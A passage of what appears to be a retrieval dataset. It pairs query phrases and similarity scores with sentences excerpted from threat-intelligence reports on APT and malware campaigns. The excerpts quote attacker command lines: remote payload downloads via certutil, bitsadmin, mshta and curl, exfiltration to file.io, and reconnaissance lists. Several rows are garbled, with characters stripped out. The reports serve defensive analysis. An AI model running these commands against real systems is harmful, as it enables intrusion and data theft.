server as an attacker for further operational security.3.']"
The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actor´s system to the victim.|0.962127938346567|"['Escalate Privileges with Stolen Credentials The threat actor uses stolen passwords from valid accounts as the primary vector for privilege escalation.', 'The actor deployed various credential stealing techniques against compromised hosts to obtain user account passwords in NTLM hash format and saved credentials from web browser.', 'These passwords would allow the threat actor to escalate privileges using valid accounts if the accounts were privileged .', ""The Cobalt Strike Cat beacon logs (Figure 12) show that the actor uploaded LaZagne onto the infected device for credential harvesting purposes and deleted the LaZagne binary after execution to avoid detection from the user's side."", 'EclecticIQ researchers observed LaZagne uploaded from the attacker device (C:\\\\Users\\\\Test\\\\Desktop\\\\ONE-FOX_V1.0_by \\\\gui_other\\\\Cobalt_Strike_4.5\\\\plugin\\\\TaoWu\\\\script\\\\lazagne.exe) to the victim device file path C:\\\\Windows\\\\Temp.', 'The actor leveraged ONE-FOX - a collection of pentest tools - to copy binaries from actors system to the victim.', '10/19Figure 12 Threat actor successfully obtained user account credentials in NTLM format.', 'The threat actor utilized an open-source tool called HackBrowserData to export victim browser data, including passwords, history, cookies, bookmarks and download records from several web browsers.', 'Figure 13 Execution of Hack-browser-data on infected host.', 'Maintain Presence via Windows Service Installation To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload.', 'Windows services ran with the highest privilege, NT AUTHORITY\\\\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence.']"
UAC BYPASS|0.7758481824716823|"[',  (Kill Switch)      .', ',    (Kill Switch) .', '01.', '(Fileless)      .', '(1) (FILELESS)     v2.1, v2.1( ver- sion=3.0.0), v3.0  .', '.', 'ASEC REPORT Vol.91 | Security Trend 41-1) v2.1 4 ,     v2.1  .', '(Magnitude)   ,  [ 1-1] .', '1-1 | v2.1     ,   mshta.exe, rundll32.', 'exe, WMIC.exe  URL .', '.']"
UAC BYPASS|0.7887880352241177|['Noob is a word describing that someone is new to a game, concept, or idea; implying a lack of experience.', 'But now lets have a look at what the botnet really is.', 'Marketing vs.', 'Reality After having a glimpse at the ad designed to promote the malware, we analyzed a sample of it: 3917107778F928A6F65DB34553D5082A, which is detected as Gen:Variant.Zusy.118945.', 'We decided to analyze some features mentioned in the flyer and on the other website to evaluate their power and implementation.', 'Feature: Bypass UAC As expected, the malware does not really bypass the UAC.', 'It rather uses a classic trick already used by several malware instances.', 'It uses a legitimate Microsoft binary in order to execute itself with administrator permissions.', 'We already presented this technique in our G DATA SecurityBlog article about the Beta Bot.', 'Feature: Anti-VM The flyer explains that the botnet wont work in a virtual machine.', 'To detect whether the malware is running in a virtual machine, the malware author checks if the following directories and the one file exist: C:\\\\Program Files\\\\VMWare\\\\VMware Tools\\\\ C:\\\\Program Files (x86)\\\\VMware\\\\WMware Tools\\\\ C:\\\\WINDOWS\\\\system32\\\\VBoxtray.exe Furthermore, the malware checks if following applications analysts usually use are being executed: Wireshark: a network analyzer Fiddler: a web proxy used to debug HTTP flow.']
UAC BYPASS|0.8881387222170556|"['Decoded shellcode in mpsvc.dll In the end, the shellcode in mpsvc.mui has another different piece of hard-coded bytes, which will decompress by RtlDecompressBuffer to the final malicious executable (Figure 4).', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 4/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 4.', 'The final malicious executable in buffer.', 'Sample Analysis The final malicious executable sample we extracted has numerous features.', 'Here is the analysis of some major functions.', 'Bypass UAC This sample can bypass UAC via .NET.', 'It is not a new technique which was disclosed in 2017 , the threat actor only changes the GUID to 9BA94120-7E02-46ee- [1] ADC6-10640B04F93B (Figure 5) and specify the location of DLL file which will load by the .NET application in the elevated process.', 'www.talent-jump.com/article/2020/02/17/CLAMBLING-A-New-Backdoor-Base-On-Dropbox-en/ 5/232/18/2020 CLAMBLING - A New Backdoor Base On Dropbox (EN) | Figure 5.', 'Code snippet of bypass UAC.', 'Persistence There are two ways to persist.', 'Register as a startup program in HKEY_CURRENT_USER\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersio n\\\\\\\\Run if it has no privileged (Figure 6).']"
UAC BYPASS|0.7715387642790528|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
the actor introduced a downloader to fetch and spawn the next stage payload|0.8761507281186623|['1/12Executive summary BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNoroff group expanded file types and tweaked infection methods; BlueNoroff created numerous fake domains impersonating venture capital companies and banks.', 'Background At the end of September 2022, we observed new BlueNoroff malware in our telemetry.', 'After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.', 'The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.', 'They also started using disk image file formats, .iso and .vhd, to deliver their malware.', 'For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.', 'Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.', 'Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document.', 'The victim received a document file named Shamjit Client Details Form.doc on September 2, 2022.', 'Unfortunately, we couldnt acquire the document, but it was executed from the following path: C:\\\\Users\\\\[username]\\\\Desktop\\\\SALES OPS [redacted]\\\\[redacted]\\\\Signed Forms & Income Docs\\\\Shamjit Client Details Form.doc Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.', '2/12Upon launch, the malicious document connects to the remote server and downloads the payload.']
the actor introduced a downloader to fetch and spawn the next stage payload|0.8761507281186623|['Also, they created numerous fake domains that look like venture capital and bank domains.', 'Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities.Executive summaryBlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures;BleuNoroff group expanded file types and tweaked infection methods;BlueNoroff created numerous fake domains impersonating venture capital companies and banks.BackgroundAt the end of September 2022, we observed new BlueNoroff malware in our telemetry.', 'After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload.', 'The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script.', 'They also started using disk image file formats, .iso and .vhd, to deliver their malware.', 'For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload.', 'Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.Novel infection chainLong-lasting initial infectionBased on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document.', 'The victim received a document file named Shamjit Client Details Form.doc on September 2, 2022.', 'Unfortunately, we couldnt acquire the document, but it was executed from the following path:C:\\\\Users\\\\[username]\\\\Desktop\\\\SALES OPS [redacted]\\\\[redacted]\\\\Signed Forms & Income Docs\\\\Shamjit Client Details Form.docJudging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.Upon launch, the malicious document connects to the remote server and downloads the payload.', 'In this particular case, the executableieinstal.exewas used to bypass UAC.Remote URL: https://bankofamerica.us[.', ']org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE=Created payload path: %Profile%\\\\cr.datSpawned command: cmd.exe %Profile%\\\\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU=After initial infection, we observed several keyboard hands-on activities by the operator.']
They then returned 18 hours later to install further malware|0.8812764579660414|['In this particular case, the executable ieinstal.exe was used to bypass UAC.', 'Remote URL: https://bankofamerica.us[.', ']org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= Created payload path: %Profile%\\\\cr.dat Spawned command: cmd.exe %Profile%\\\\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU= After initial infection, we observed several keyboard hands-on activities by the operator.', 'Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges.', 'Upon infection, the operator executed several Windows commands to gather basic system information.', 'They then returned 18 hours later to install further malware with high privileges.', 'Post-exploitation Based on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server: Download URL: http://avid.lno-prima[.', ']lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI= The fetched payload is supposed to be saved in %Profile%\\\\update.dll.', 'Eventually, the fetched file is spawned with the following commands: Command #1: rundll32.exe %Profile%\\\\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ== Command #2: rundll32.exe %Profile%\\\\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4= One of the other methods the BlueNoroff group usually uses is a ZIP archive with a shortcut file.', 'The archive file we recently discovered contained a password-protected decoy document and a shortcut file named Password.txt.lnk.', 'This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy documents password.']
a file downloaded from the internet,|0.7778975501331428|['In 2019, we exposed Operation Ghost [41], a largescale espionage operation targeting ministries of foreign affairs in Once opened in a browser, the HTML file automatically triggers what seems like the download of an Europe.', 'In 2020, the group received a lot of attention for the supplychain ISO disk image file.', 'In order to succeed, the intended victim must choose either to save this file and attack piggybacking on SolarWinds, leading to the compromise of major subsequently open it, or to open it directly.', 'If either is chosen, a small piece of JavaScript decodes the organizations including many parts of the US government.', 'ISO file, which is embedded directly in the HTML attachment.', 'It is not downloaded from the internet.', 'The Dukes: Phishing European diplomats In the previous threat report, ESET researchers highlighted several spearphishing campaigns against European diplomats.', 'These malicious operations were attributed to an infamous cyberespionage group known as the Dukes.', 'In October and November 2021, ESET detected additional spearphishing campaigns, again targeting European diplomatic missions and Ministries of Foreign Affairs.', 'ESET researchers also attribute these new operations to the Dukes.', 'This is in line with recent open-source reporting such as this report [42] by ANSSI (the French National Agency for the Security of Information Systems) released in early December 2021.']
fetch the next stage payload.|0.778658889558533|"['As we can see, the actor uses content the victim could be interested in, such as an event to be held in the near future, a specific request form, and the resume of a high-profile individual.', 'Decoy documents 5/14Malicious document and method of delivering next stage payload Malicious documents delivered to the victim contain a macro to fetch the next stage payload.', 'The macro has a simple functionality and, interestingly, it spawns several child Windows command shells, probably intended for evading behavior-based analysis.', 'Eventually, the macro executes a fetched payload with the mshta.exe process that is designed to execute a Microsoft HTML Application.', 'The following scriptlet is part of a malicious macro in the document.', 'It contains a remote server address to fetch the next stage payload.', 'cmd = ""c"" + ""md /"" + ""c c"" + ""md /"" + ""c cm"" + ""d /"" + ""c c"" + ""m"" + ""d /"" + ""c c"" + ""md /"" + ""c c"" + 1 ""md /"" + ""c msht"" + ""a.e"" + ""xe hxxp://leehr24.mywebcommunity[.', ']org/h.php"" 2 Shell cmd, 0 3 Sleep 9000 4 cmd = ""cm"" + ""d /"" + ""c TAS"" + ""KKI"" + ""LL /"" + ""F /"" + ""IM msh"" + ""ta.e"" + ""xe"" 5 Shell cmd, 0 Luckily, we discovered the corresponding C2 script (h.php) from our telemetry.', 'This script saves incoming traffic information to the log.txt file including the date, IP address, user-agent and the right-most 20 characters of the IP MD5 hash which is internally called TID (probably short for Target ID).', 'Next, it checks the presence of the allow.txt file that contains IP addresses of verified victims.', 'Only if the clients IP address exists in the allow.txt, is the next stage payload, h.txt, delivered.']"
cmd.exe /c|0.8104175652537835|"['The malware then creates the directory %APPDATA%\\\\DameWareNT.', 'If the creation of this directory fails, the malware uses the directory %TEMP%\\\\DameWareNT instead.', 'In the newly-created DameWareNT folder, a file named data_0 is created.', 'The file contains a VictimID string, which consists of eight random characters.', 'If the file already exists, it is cleared, with the exception of the first line, retaining the previously created VictimID.', ""Next, the following commands are appended to the file, encrypted using XOR key 0xA5: cmd.exe /c ipconfig /all cmd.exe /c tasklist /svc cmd.exe /c netstat -ano cmd.exe /c systeminfo cmd.exe /c arp -a cmd.exe /c net use cmd.exe /c net user /domain cmd.exe /c net group /domain cmd.exe /c query user Finally, the malware starts two threads: The malware's first thread runs a check every three seconds to determine if the number of connected removable drives has changed."", 'If a change is detected, the following actions are performed: The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the : character in the file name indicates that NTFS alternate data streams are used) or the file System Volume Information\\\\_WFConfig.log (in case of a FAT-formatted drive).', 'If found, the data in the file is appended to the contents of the data_0 file.', 'Files with the .res extension in the DameWareNT directory are scanned, and their contents are copied to the removable drive in a file named either desktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume Information_WTSettings_%VictimID%.log (for FAT).', 'The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System Volume Information_WRConfig_%VictimID%.log (for FAT).', 'If found, the data in the file is added to the contents of the data_0 file.']"
cmd.exe /c|1.0|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd.exe /c|0.8886415531257763|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
cmd.exe /c|0.7970209500418814|"['It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed suggesting this is all part of the same campaign.', 'Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These commands are as follows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is seen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Host: www.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.', ']in as a C&C channel but instead was downloaded from the URL: hxxps://www.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
cmd.exe /c|0.8352002528474389|"['Modular architecture of the victims infection process provides both additional flexibility and anonymity throughout the cyber-attack.', 'This scheme allows hackers to divide software development activity between teams, as well as to ensure the reuse of program code.', 'Recon Performs initial reconnaissance to determine if a systems is of interest to the threat actors Dropper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TrafficForwarder and injects into the legitimate process Client_TrafficForwarder Forwards operators commands from external network into corporate network Client_RAT Provides full control over the target system Recon is a backdoor that is initially installed on the target machine through successful execution of exploits.', 'This module is used by hackers to perform initial reconnaissance to search for systems of interest.', 'Once launched, the program adds itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\ Start Menu\\\\Programs\\\\Startup"", collects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data collected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\ CurrentVersion\\\\Internet Settings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tools, attribution1 Key 2 Attack 3 Attack 4 Recommendations 5 Indicators of 6 Appendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module will use the ""killkill"" command to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Dropper using the http command.', 'Dropper will then install Client_RAT to the infected system as follows: RECON DROPPER LOADER CLIENT_RAT 1 2 3 DROPPER Recon decrypts LOADER Dropper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Dropper extracts decrypted Client_RAT Client_RAT Dropper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Dropper needs MD5 encryption key, which only the attacker knows.', 'Group-IB specialists have analyzed two versions of Dropper.', 'There are no fundamental differences between them: both versions were used to decrypt the loader and encrypted payload, as well as to ensure loader persistence in the system.']"
cmd.exe /c|0.8005088309270048|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd.exe /c|0.7784302417153919|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd.exe /c|0.7610348906349725|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
cmd.exe /c|1.0|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd.exe /c|0.8089725984772371|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd.exe /c|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
the scriptlet of the batch file|0.8366079079797397|"['The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the system folder.', 'This script is for executing the PowerShell script via a Windows scheduled task.', 'WScript.exe ""%system32%\\\\SyncAppvPublishingServer.vbs"" ""n;cmd.exe \'/c curl 1perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\\\regsile.bat & start /b %public%\\\\regsile.bat\' We also observed the context around that batch file in our telemetry.', 'The batch file name is What is Blockchain.bat.', 'As the file name suggests, this group still targets the blockchain industry.', 'We acquired the scriptlet of the batch file.', '1xcopy /h /y /q How-To-Extension.pdf c:\\\\users\\\\public\\\\Inproc.exe* 2start xcopy /h /y /q Blockchain-old.pdf c:\\\\users\\\\public\\\\rwinsta.exe* 3start c:\\\\users\\\\public\\\\Inproc.exe ""%cd%\\\\Blockchain.pdf"" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c00fa5c9bef2), and the rwinsta.exe is a legitimate rundll32.exe file (MD5 ef3179d498793bf4234f708d3be28633).', 'The Blockchain.pdf file is a malicious HTML application file spawned by the mshta.exe process.', 'Unfortunately, we dont have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on our telemetry showing the decoy document and fetching the next stage payload.', '1# Create a decoy password file and open it.', '2cmd.exe"" /c echo {PASSWORD}>%documents%\\\\Userlink & notepad.exe %documents%\\\\Userlink 3 4# Fetch the payload with cURL command and execute.']"
"cmd.exe"" /c"|0.8104175652537835|"['The malware then creates the directory %APPDATA%\\\\DameWareNT.', 'If the creation of this directory fails, the malware uses the directory %TEMP%\\\\DameWareNT instead.', 'In the newly-created DameWareNT folder, a file named data_0 is created.', 'The file contains a VictimID string, which consists of eight random characters.', 'If the file already exists, it is cleared, with the exception of the first line, retaining the previously created VictimID.', ""Next, the following commands are appended to the file, encrypted using XOR key 0xA5: cmd.exe /c ipconfig /all cmd.exe /c tasklist /svc cmd.exe /c netstat -ano cmd.exe /c systeminfo cmd.exe /c arp -a cmd.exe /c net use cmd.exe /c net user /domain cmd.exe /c net group /domain cmd.exe /c query user Finally, the malware starts two threads: The malware's first thread runs a check every three seconds to determine if the number of connected removable drives has changed."", 'If a change is detected, the following actions are performed: The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the : character in the file name indicates that NTFS alternate data streams are used) or the file System Volume Information\\\\_WFConfig.log (in case of a FAT-formatted drive).', 'If found, the data in the file is appended to the contents of the data_0 file.', 'Files with the .res extension in the DameWareNT directory are scanned, and their contents are copied to the removable drive in a file named either desktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume Information_WTSettings_%VictimID%.log (for FAT).', 'The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System Volume Information_WRConfig_%VictimID%.log (for FAT).', 'If found, the data in the file is added to the contents of the data_0 file.']"
"cmd.exe"" /c"|1.0|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior 